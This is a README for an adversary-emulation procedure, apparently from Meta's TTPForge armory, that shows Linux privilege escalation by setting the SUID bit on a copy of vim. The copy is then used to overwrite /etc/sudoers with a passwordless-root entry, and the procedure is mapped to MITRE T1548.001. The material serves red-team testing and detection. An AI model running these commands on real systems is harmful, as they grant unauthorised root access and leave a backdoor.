# Suid Binary Escalation

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP demonstrates how to use a SUID binary to escalate privileges.

## Arguments

- **unprivduser**: The unprivileged user to switch to before using the SUID binary.

## Prerequisites

The executor must be run as root user.

## Examples

```bash
ttpforge run forgearmory//privilege-escalation/linux/suid-binary-escalation/suid-binary-escalation.yaml \
  --arg unprivduser=SOME_USER
```

## Manual Reproduction Steps

```
### Escalate privileges for setup
sudo su

# Setup privesc
cp /usr/bin/vim /usr/bin/vim.old && \
    chmod u+s /usr/bin/vim.old

### Change to a user that does not have sudo privileges
su - unprivduser

# Hunt for SUID bins
find / -perm -4000

# Add unprivileged user to the sudoers file
/usr/bin/vim.old -b -c "s/.*/$(whoami) ALL=(ALL) NOPASSWD:ALL/" -c "wq!" /etc/sudoers 2> /dev/null

### Confirm success - should return root
sudo su
whoami
```

## Steps

1. setup-privileges: This step creates a copy of the target binary and sets the SUID bit on it. Additionally, a cleanup step is provided to remove the copy post-execution unless --no-cleanup is specified.
2. hunt-for-suid-bins: This step searches for all SUID binaries on the system.
3. escalate-privilege: This step switches to the unprivileged user and uses the SUID binary to escalate privileges. If successful, the output will show "TTP Ran Successfully". Otherwise, it will show "TTP failed".

## MITRE ATT&CK Mappinp

- **Tactics**:
    - TA0004 Privilege Escalation
- **Techniques**:
    - T1548 Abuse Elevation Control Mechanism
- **Subtechniques**:
    - T1548.001 Abuse Elevation Control Mechanism Setuid and Setgid
